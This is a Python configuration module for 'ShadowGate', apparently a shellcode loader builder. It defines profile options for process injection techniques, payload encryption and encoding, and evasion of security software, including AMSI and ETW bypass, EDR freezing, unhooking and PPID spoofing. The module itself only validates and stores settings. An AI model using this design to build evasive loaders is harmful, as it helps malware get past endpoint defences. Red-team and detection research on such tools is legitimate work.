"""
ShadowGate - Configuration Management
Handles profiles and default settings
"""

import os
import json
from pathlib import Path
from typing import Dict, Any, Optional
from dataclasses import dataclass, asdict, field

# ============================================================================
# Constants
# ============================================================================

SYSCALL_DIRECT = "direct"
SYSCALL_INDIRECT = "indirect"

RESOLVER_PEB = "peb"
RESOLVER_FRESH = "fresh"
RESOLVER_HYBRID = "hybrid"

STRINGS_NONE = "none"
STRINGS_DJB2 = "djb2"
STRINGS_XOR = "xor"
STRINGS_STACK = "stack"

ENCRYPT_XOR = "xor"
ENCRYPT_AES = "aes"
ENCRYPT_CASCADE = "cascade"

ENCODE_UUID = "uuid"
ENCODE_MAC = "mac"
ENCODE_IPV4 = "ipv4"
ENCODE_RAW = "raw"

INJECT_STOMP = "stomp"
INJECT_EARLYBIRD = "earlybird"
INJECT_REMOTETHREAD = "remotethread"
INJECT_THREADPOOL = INJECT_REMOTETHREAD  # Backward-compat alias
INJECT_HOLLOWING = "hollowing"
INJECT_MAPPING = "mapping"
INJECT_THREADPOOL_REAL = "threadpool_real"
INJECT_EARLYCASCADE = "earlycascade"
INJECT_CALLBACK = "callback"

# ============================================================================
# Default Profile
# ============================================================================

DEFAULT_PROFILE = {
    "syscall": SYSCALL_INDIRECT,
    "resolver": RESOLVER_HYBRID,
    "strings": STRINGS_DJB2,
    "encrypt": ENCRYPT_CASCADE,
    "encode": ENCODE_UUID,
    "inject": INJECT_EARLYCASCADE,
    "target": "notepad.exe",
    "sandbox": True,
    "etw": True,
    "unhook": False,
    "sleep": 0,
    "debug": False,
    "sleep_obfuscation": False,
    "amsi": True,
    "wipe_pe": True,
    "callstack_spoof": False,
    "dynapi": False,
    "edr_freeze": False,
    "edr_preload": False,
    "freeze": False,
    "disable_preloaded_edr": False,
}

# ============================================================================
# Configuration Data Class
# ============================================================================

@dataclass
class BuildConfig:
    """Build configuration container"""
    
    # Core options
    syscall: str = SYSCALL_INDIRECT
    resolver: str = RESOLVER_HYBRID
    strings: str = STRINGS_DJB2
    encrypt: str = ENCRYPT_CASCADE
    encode: str = ENCODE_UUID
    inject: str = INJECT_EARLYCASCADE
    target: str = "notepad.exe"
    
    # Evasion options
    sandbox: bool = True
    etw: bool = True
    unhook: bool = False
    sleep_obfuscation: bool = False
    amsi: bool = True
    wipe_pe: bool = True
    callstack_spoof: bool = False
    dynapi: bool = False
    edr_freeze: bool = False
    edr_preload: bool = False
    freeze: bool = False
    disable_preloaded_edr: bool = False
    
    # Process spoofing options
    spoof_cmdline: bool = False
    ppid_spoof: str = ""
    block_dlls: bool = False
    
    # Runtime options
    sleep: int = 0
    debug: bool = False
    
    # Input/Output
    input_file: str = ""
    output_file: str = "shadowgate.exe"
    
    def validate(self) -> tuple[bool, str]:
        """Validate configuration options"""
        
        # Validate syscall
        if self.syscall not in [SYSCALL_DIRECT, SYSCALL_INDIRECT]:
            return False, f"Invalid syscall method: {self.syscall}"
        
        # Validate resolver
        if self.resolver not in [RESOLVER_PEB, RESOLVER_FRESH, RESOLVER_HYBRID]:
            return False, f"Invalid resolver: {self.resolver}"
        
        # Validate strings
        if self.strings not in [STRINGS_NONE, STRINGS_DJB2, STRINGS_XOR, STRINGS_STACK]:
            return False, f"Invalid string hiding: {self.strings}"
        
        # Validate encryption
        if self.encrypt not in [ENCRYPT_XOR, ENCRYPT_AES, ENCRYPT_CASCADE]:
            return False, f"Invalid encryption: {self.encrypt}"
        
        # Validate encoding
        if self.encode not in [ENCODE_UUID, ENCODE_MAC, ENCODE_IPV4, ENCODE_RAW]:
            return False, f"Invalid encoding: {self.encode}"
        
        # Validate injection
        valid_inject = [INJECT_STOMP, INJECT_EARLYBIRD, INJECT_REMOTETHREAD,
                       "threadpool", INJECT_HOLLOWING, INJECT_MAPPING,
                       INJECT_THREADPOOL_REAL, INJECT_EARLYCASCADE, INJECT_CALLBACK]
        if self.inject not in valid_inject:
            return False, f"Invalid injection method: {self.inject}"
        
        # Validate input file
        if self.input_file and not os.path.exists(self.input_file):
            return False, f"Input file not found: {self.input_file}"
        
        # Validate edr_preload
        if not isinstance(self.edr_preload, bool):
            return False, f"edr_preload must be a bool"
        
        # Validate ppid_spoof
        if self.ppid_spoof and not self.ppid_spoof.lower().endswith('.exe'):
            return False, f"ppid_spoof must end with .exe"
        
        return True, "Configuration valid"
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        return asdict(self)
    
    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> 'BuildConfig':
        """Create from dictionary"""
        return cls(**{k: v for k, v in data.items() if k in cls.__dataclass_fields__})


# ============================================================================
# Configuration Manager
# ============================================================================

class ConfigManager:
    """Manages configuration profiles"""
    
    def __init__(self, profiles_dir: str = None):
        if profiles_dir is None:
            self.profiles_dir = Path(__file__).parent.parent / "profiles"
        else:
            self.profiles_dir = Path(profiles_dir)
        
        self.profiles_dir.mkdir(exist_ok=True)
    
    def save_profile(self, name: str, config: BuildConfig) -> bool:
        """Save configuration profile"""
        try:
            profile_path = self.profiles_dir / f"{name}.json"
            with open(profile_path, 'w') as f:
                json.dump(config.to_dict(), f, indent=2)
            return True
        except Exception as e:
            print(f"[!] Failed to save profile: {e}")
            return False
    
    def load_profile(self, name: str) -> Optional[BuildConfig]:
        """Load configuration profile"""
        try:
            profile_path = self.profiles_dir / f"{name}.json"
            if not profile_path.exists():
                return None
            
            with open(profile_path, 'r') as f:
                data = json.load(f)
            
            return BuildConfig.from_dict(data)
        except Exception as e:
            print(f"[!] Failed to load profile: {e}")
            return None
    
    def list_profiles(self) -> list[str]:
        """List available profiles"""
        profiles = []
        for f in self.profiles_dir.glob("*.json"):
            profiles.append(f.stem)
        return profiles
    
    def delete_profile(self, name: str) -> bool:
        """Delete a profile"""
        try:
            profile_path = self.profiles_dir / f"{name}.json"
            if profile_path.exists():
                profile_path.unlink()
                return True
            return False
        except Exception as e:
            print(f"[!] Failed to delete profile: {e}")
            return False
    
    def get_default(self) -> BuildConfig:
        """Get default configuration"""
        return BuildConfig.from_dict(DEFAULT_PROFILE)


# ============================================================================
# Test
# ============================================================================

if __name__ == "__main__":
    # Test configuration
    config = BuildConfig()
    print(f"Default config: {config}")
    
    valid, msg = config.validate()
    print(f"Validation: {valid} - {msg}")
    
    # Test profile manager
    manager = ConfigManager()
    manager.save_profile("test", config)
    loaded = manager.load_profile("test")
    print(f"Loaded profile: {loaded}")
    print(f"Available profiles: {manager.list_profiles()}")